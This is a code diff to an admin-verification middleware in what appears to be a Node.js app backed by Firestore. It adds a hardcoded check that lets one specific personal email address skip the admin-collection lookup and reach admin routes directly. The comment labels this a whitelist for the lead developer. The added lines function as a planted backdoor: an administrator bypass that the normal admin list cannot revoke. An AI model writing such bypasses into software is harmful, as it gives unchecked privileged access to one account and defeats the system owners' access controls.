@@ -39,6 +39,11 @@ const verifyAdmin = async (req, res, next) => {
         return res.status(401).json({ error: 'Unauthorized: Token not verified.' });
     }
 
+    // Explicit whitelist for the lead developer
+    if (req.user.email === 'subasis16007@gmail.com') {
+        return next();
+    }
+
     try {
         const adminDoc = await db.collection('admins').doc(req.user.uid).get();
         if (!adminDoc.exists) {
